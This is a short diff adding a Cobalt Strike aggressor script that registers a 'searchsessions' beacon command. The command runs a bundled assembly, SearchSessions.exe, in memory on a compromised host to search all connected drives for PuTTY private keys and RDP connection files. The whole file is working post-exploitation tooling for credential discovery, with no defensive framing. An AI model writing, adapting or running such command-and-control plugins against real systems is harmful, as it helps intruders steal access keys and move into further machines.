@@ -1,0 +1,18 @@
+beacon_command_register("searchsessions", "Searches all connected drives for PuTTY private keys and RDP connection files and parses them for relevant details.",
+	"Usage: searchsessions [arguments]\n\n" .
+	"Uses execute-assembly to run the assembly No Arguments Required\n");
+alias searchsessions{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "SearchSessions";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/SearchSessions.exe"), $argu);
+}
